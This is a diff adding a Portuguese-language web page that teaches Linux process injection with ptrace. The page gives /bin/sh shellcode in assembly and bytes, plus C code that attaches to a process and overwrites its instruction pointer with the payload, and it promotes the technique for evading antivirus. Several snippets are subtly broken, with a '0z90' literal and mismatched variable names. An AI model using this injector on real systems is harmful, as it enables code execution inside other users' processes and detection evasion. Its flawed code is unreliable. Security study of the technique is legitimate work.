@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="../../css/css-paper/paper.css">
+    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
+    <title>Process Injection no Linux usando a biblioteca
+PTRACE - pwnbuffer.org</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+    <div class="main_container">
+        <header class="header_top">
+            <div class="left-section">
+                <a href="../../index.html" class="menu-link">/home</a>
+                <a href="../../p/papers.html" class="menu-link">/papers</a>
+                <a href="../../a/about.html" class="menu-link">/about-us</a>
+                <a href="../../w/worms.html" class="menu-link">/worms</a>
+            </div>
+            <div class="right-section">
+                <span class="glitch-text">pwn@buff3r</span>
+            </div>
+
+        </header>
+
+        <main class="content">
+            <h1 class="pwntitle">Process Injection no Linux usando a
+biblioteca PTRACE</h1>
+            <article>
+                    <p><code>Author:</code> hoWo<br><code>Date:</code> 2025-10-06 </p>
+                    
+                    <hr>
+
+                  <h1
+                  id="process-injection-no-linux-usando-a-biblioteca-ptrace">Process
+                  Injection no Linux usando a biblioteca PTRACE</h1>
+                  <p>Neste artigo, vamos aprender sobre injeção de
+                  processos (Process Injection) em distribuições linux
+                  usando PTRACE</p>
+                  <h2 id="shellcode">Shellcode</h2>
+                  <p>Primeiramente, precisamos de um shellcode, neste
+                  estudo eu irei utilizar o meu (disponível no <a
+                  href="https://github.com/Yyax13/shellcode"><em>meu
+                  github</em></a>).</p>
+                  <p>Para facilitar a compreensão, deixarei o shellcode
+                  (em asm) aqui:</p>
+                  <pre class="assembly"><code>section .text
+global _start
+
+_start:
+    xor rax, rax                        ; rax turns to null byte
+
+    push rax                            ; push \0 (null byte) to the stack
+    mov rbx, 0x68732f6e69622f           ; &#39;/bin/sh&#39; string
+    push rbx
+
+    mov rdi, rsp                        ; rdi (path) receive rbx (&#39;/bin/sh\0&#39;)
+
+    push rax                            ; null byte (execve require {path, NULL})
+    push rdi                            ; ptr to our path
+    mov rsi, rsp                        ; rsi (argv) receive
+    
+    xor rdx, rdx
+    mov rax, 59
+    
+    syscall</code></pre>
+                  <p>E sua versão em C:</p>
+                  <pre class="c"><code>unsigned char shellcode[] = {
+  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
+  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
+  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
+
+};
+</code></pre>
+                  <p>O .asm já foi documentado em seu próprio
+                  repositório, então não iremos perder tempo analisando
+                  o mesmo.</p>
+                  <h2 id="o-injector">O injector</h2>
+                  <p>Começaremos incluindo tudo que vamos precisar:</p>
+                  <pre class="c"><code>#include &lt;stdio.h&gt;          // printf
+#include &lt;stdlib.h&gt;         // NULL
+#include &lt;unistd.h&gt;         // getpid e qualquer outra coisa
+#include &lt;errno.h&gt;          // erros
+#include &lt;sys/ptrace.h&gt;     // a biblioteca ptrace
+#include &lt;sys/wait.h&gt;       // waitpid
+#include &lt;sys/user.h&gt;       // type user_regs_struct
+#include &lt;sys/types.h&gt;      // pid_t
+</code></pre>
+                  <p>E inserir nosso shellcode:</p>
+                  <pre class="c"><code>unsigned char shellcode[] = {
+  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
+  0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
+  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
+
+};
+
+size_t shellcodeLen = sizeof(shellcode);</code></pre>
+                  <p>Após isso, nós já podemos iniciar a função
+                  principal (se você quiser, nada te impede de criar uma
+                  função para fazer a injeção, mas para facilitar o
+                  entendimento, faremos tudo na main):</p>
+                  <pre class="c"><code>int main(int argc, char *argv[])</code></pre>
+                  <p>O parâmetro <code>argc</code> conta a quantidade de
+                  argumentos passados na hora de executar o programa, e
+                  o <code>argv</code> é um array de strings que contém
+                  os argumentos (o primeiro argumento sempre será o nome
+                  do programa).</p>
+                  <h3 id="parse-do-pid-inserido-pelo-usuário">Parse do
+                  PID inserido pelo usuário</h3>
+                  <p>Para <em>parsear</em> o PID, precisamos verificar
+                  se o usuário inseriu o PID corretamente:</p>
+                  <pre class="c"><code>if (argc != 2) { // Se argc for menos de 2 args (primeiro é o caminho do binário)
+    printf(&quot;Usage: %s &lt;pid&gt;\n&quot;, argv[0]); // Printa o jeito correto de utilizar 
+    return 1; // Retorna 1 (shell interpreta como um erro)
+
+}
+
+pid_t procID = (pid_t)atoi(argv[1]); // Atoi converte argv[1] para int, e depois fazemos cast para pid_t (atoi é inseguro, o ideal é usar strtol)
+if (procID &lt;= 0) { // Se o PID for inválido
+    fprintf(stderr, &quot;Invalid PID\n&quot;, argv[1]); // Print o erro
+    return 1; // Retorna 1 (erro)
+
+}</code></pre>
+                  <p>Após isso nós já temos o PID do processo que iremos
+                  injetar o shellcode, se você quiser, pode verificar se
+                  o processo realmente existe.</p>
+                  <h3
+                  id="anexando-ao-processo-alvo-com-ptrace_attach">Anexando
+                  ao processo alvo com PTRACE_ATTACH</h3>
+                  <p>Após validar o PID, precisamos anexar ao processo
+                  alvo.<br></p>
+                  <blockquote>
+                  <p>Anexar um processo pode pedir permissões de root,
+                  <a
+                  href="https://www.kernel.org/doc/Documentation/security/Yama.txt?utm_source=https://github.com/Yyax13/proc_injection">este
+                  artigo</a> explica como você pode verificar isso.</p>
+                  </blockquote>
+                  <pre class="c"><code>// Anexa ao processo se baseando no PID e verifica por erros (retorno -1 é um erro)
+if (ptrace(PTRACE_ATTACH, procID, NULL, NULL) == -1) {
+    perror(&quot;Can&#39;t attach&quot;); // perror printa algo como: &quot;Can&#39;t attach: uau, eu sou a mensagem de erro&quot;
+    return 1; // Encerra o programa
+
+}</code></pre>
+                  <h3 id="aguardando-o-processo">Aguardando o
+                  processo</h3>
+                  <p>Agora, precisamos parar o processo alvo, se não,
+                  nós não poderemos sobreescrever o RIP do processo.</p>
+                  <p>Nós podemos pará-lo usando waitpid e argumentos:
+                  <code>PID, int *status</code>.</p>
+                  <pre class="c"><code>// Espera o processo parar
+int status;
+if (waitpid(procID, &amp;status, 0) == -1) { // Este 0 pode ser NULL também
+    perror(&quot;Can&#39;t wait for the target&quot;);
+    goto detach; // Vai para o label detach se algum erro ocorrer
+
+}</code></pre>
+                  <p>E verificamos se tudo está bem:</p>
+                  <pre class="c"><code>// Verifica se o processo parou com sucesso
+if (!WIFSTOPPED(status)) { // WIFSTOPPED expande para (((status) &amp; 0xff) == 0x7f) e verifica se o processo parou
+    fprintf(stderr, &quot;Target did not stop as expected\n&quot;);
+    goto detach;
+
+}</code></pre>
+                  <h3
+                  id="obtendo-os-registradores-do-processo-e-seu-rip">Obtendo
+                  os registradores do processo e seu RIP</h3>
+                  <blockquote>
+                  <p>Se você não sabe o que são os registradores, você
+                  pode ler <a
+                  href="https://blog.codingconfessions.com/p/linux-context-switching-internals?utm_source=https://github.com/Yyax13/proc_injection">este
+                  artigo</a></p>
+                  </blockquote>
+                  <p>Agora, o processo já está parado, então podemos
+                  obter algumas informações:</p>
+                  <pre class="c"><code>// Obtém os registradores do processo
+struct user_regs_struct regs; // Struct que irá armazenar os registradores
+if (ptrace(PTRACE_GETREGS, procID, NULL, &amp;regs) == -1) { // Usa PTRACE_GETREGS com os args procID, NULL, &amp;regs para obter os registradores do processo
+    perror(&quot;Can&#39;t get target regs&quot;);
+    goto detach;
+
+}</code></pre>
+                  <p>Agora, já temos todos os registradores, mas
+                  precisamos obter o RIP, e é mais fácil do que obter os
+                  registradores:</p>
+                  <pre class="c"><code>unsigned long address = regs.rip; // Apenas obtém o rip da struct regs
+printf(&quot;Target RIP: 0x%llx\n&quot;, (unsigned long long)address); // Loga o RIP</code></pre>
+                  <h2 id="sobreescrevendo-o-rip">Sobreescrevendo o
+                  RIP</h2>
+                  <p>Agora, já podemos sobreescrever o RIP para inserir
+                  nosso shellcode malicioso (neste caso, apenas abre o
+                  /bin/sh, mas você pode usar um shellcode do metasploit
+                  por exemplo):</p>
+                  <pre class="c"><code>size_t wordSize = sizeof(unsigned long); // Usa sizeof porque algumas arquiteturas de CPU são diferentes de 8
+size_t nWords = (shellcodeLen + wordSize - 1) / wordSize; // Calcula a quantidade de palavras que precisamos escrever (arredonda para cima)
+for (size_t i = 0; i &lt; nWords; i++) { // Loop para cada palavra
+    unsigned long data = 0; // Palavra atual
+    size_t base = i * wordSize; // Base é o índice inicial da palavra atual
+
+    // For loop que escreve a palavra byte-a-byte
+    for (size_t ii = 0; ii &lt; wordSize; ii++) {
+        size_t idx = base + ii; // Índice atual
+        unsigned char byte = (idx &lt; shellcodeLen) ? shellcode[idx] : 0z90; // Se o índice for menor que o tamanho do shellcode, obtém o byte do shellcode, senão, obtém 0x90
+        word |= ((unsigned long)byte &lt;&lt; (8 * ii)); // Adiciona o byte à palavra (shiftando para a posição correta)
+    
+    }
+
+    /*
+    POKETEXT escreve uma palavra no endereço do processo.
+      No nosso caso, usamos para escrever nossa palavra em address + base (rip + offset atual)
+    */
+   if (ptrace(PTRACE_POKETEXT, procID, (void*)(address + base), (void*)word) == -1) {
+        perror(&quot;Some error occurred in POKETEXT&quot;);
+        goto detach;
+
+    }
+
+    printf(&quot;Wrote 0x%lx --&gt; 0x%llx\n&quot;, word, (unsigned long long)(address + base)); // Log
+
+}</code></pre>
+                  <blockquote>
+                  <p>Se você não sabe o que é uma word, leia <a
+                  href="https://www.techtarget.com/whatis/definition/word?utm_source=pornhub.com">esse
+                  artigo</a><br> Se você não sabe o que é byte order,
+                  leia <a
+                  href="https://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/?utm_source=roblox.com">esse
+                  artigo</a><br> Se você não sabe o que &lt;&lt; faz,
+                  leia <a
+                  href="https://www.geeksforgeeks.org/cpp/left-shift-right-shift-operators-c-cpp/?utm_source=xvideos.com">esse
+                  artigo</a></p>
+                  </blockquote>
+                  <p>Inejeção concluída! Agora só precisamos desanexar o
+                  processo e nos divertir com nossa shell!</p>
+                  <h3 id="desanexando-o-processo">Desanexando o
+                  processo</h3>
+                  <p>Para este passo final, só precisamos desanexar:</p>
+                  <pre class="c"><code>if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) { // Bem simples, eu acho que não precisamos explicar isso
+    perror(&quot;Can&#39;t detach target&quot;);
+    return 1;
+
+}</code></pre>
+                  <h3 id="tratamento-de-erros">Tratamento de erros</h3>
+                  <p>Se você realmente leu este artigo, você viu
+                  <code>goto detach</code> algumas vezes, e aqui está o
+                  label <code>detach</code>:</p>
+                  <pre class="c"><code>detach: 
+    if (ptrace(PTRACE_DETACH, procID, NULL, NULL) == -1) {
+        perror(&quot;Can&#39;t detach target&quot;);
+        
+    }
+
+    return 1;</code></pre>
+                  <h2 id="conclusão">Conclusão</h2>
+                  <p>Injeção de processos é um tópico muito
+                  interessante, e pode ser usado de diversas formas, por
+                  exemplo, bypassar alguns AVs ou fazer um processo
+                  rodar algo que ele não deveria.</p>
+                  <p><img
+                  src="../../img/images/contribute/howo/proc_injection/sandbox.png"
+                  alt="[Demo no tria.ge]" /></p>
+                  <hr />
+                  <blockquote>
+                  <p>Artigo por <a
+                  href="https://github.com/Yyax13">@hoWo</a><br> Você
+                  pode encontrar a versão original deste artigo em
+                  inglês <a
+                  href="https://github.com/Yyax13/proc_injection/blob/master/paper.md">aqui</a></p>
+                  </blockquote>
+            </article>
+            
+            <a href="../../index.html" class="back-link">← Voltar para a página principal</a>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <span>&copy; 2025 - pwnbuffer.org </span>
+                <span class="footer-separator">|</span>
+                <a href="https://x.com/pwnbff" target="_blank" class="footer-link">[ X ] </a>
+                <span class="footer-separator">|</span>
+                <a href="https://discord.gg/R7sAkd4j9X" target="_blank" class="footer-link">[ Servidor Discord ] </a>
+        </footer>
+    </div>
+
+</body>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        const els = document.querySelectorAll(".glitch-text, .pwntitle");
+        const chars = "\u0025\u0023\u0024\u0040\u005E\u0026\u002A\u0021\u003F\u003C\u002D\u003E\u002B\u007C\u002A";
+
+        els.forEach(el => {
+            const originalText = el.textContent;
+
+            function glitchEffect() {
+                let iterations = 0;
+                const interval = setInterval(() => {
+                    el.textContent = originalText
+                        .split("")
+                        .map((letter, index) => {
+                            if (index < iterations) {
+                                return originalText[index];
+                            }
+                            return chars[Math.floor(Math.random() * chars.length)];
+                        })
+                        .join("");
+
+                    iterations += 1 / 2;
+
+                    if (iterations >= originalText.length) {
+                        clearInterval(interval);
+                        el.textContent = originalText;
+                    }
+                }, 50);
+            }
+
+            setInterval(glitchEffect, 20000);
+        });
+    });
+</script>
+
+</html>
